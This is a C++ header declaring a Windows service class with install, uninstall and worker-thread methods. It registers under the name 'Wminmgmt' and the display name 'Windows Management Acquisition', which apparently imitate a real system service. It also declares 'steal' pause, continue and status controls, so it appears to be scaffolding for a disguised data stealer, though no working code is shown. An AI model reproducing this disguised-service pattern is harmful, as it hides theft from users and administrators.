// Service.h: CService 类的接口。

#pragma once

#define WM_STEAL_PAUSE		WM_USER+100
#define WM_STEAL_CONTINUE	WM_USER+101

#define SERVICE_NAME            _T("Wminmgmt")
#define SERVICE_DISPLAY_NAME    _T("Windows Management Acquisition")

class CService
{
public:
	CService();
	virtual ~CService();

	void Init(LPCTSTR pServiceName, LPCTSTR pServiceDisplayedName);
	void Start();
	void ServiceMain();
	void Handler(DWORD dwOpcode);
	void Run();

	BOOL IsInstalled();
	BOOL Install();
	BOOL Uninstall();

	void SetServiceStatus(DWORD dwState);
	DWORD RecurseDeleteKey(HKEY hkey, LPCTSTR pszSubKey);

	TCHAR m_szServiceName[256];
	TCHAR m_szServiceDisplayedName[256];
	SERVICE_STATUS_HANDLE m_hServiceStatus;
	SERVICE_STATUS m_status;
	BOOL m_bService;

private:
	static void WINAPI _ServiceMain(DWORD dwArgc, LPTSTR* lpszArgv);
	static void WINAPI _Handler(DWORD dwOpcode);
	static DWORD WINAPI ThreadProc(LPVOID lpParam);
	static int StealStatus(int iState = -1);

	DWORD m_dwThreadID;
};

extern CService _Module;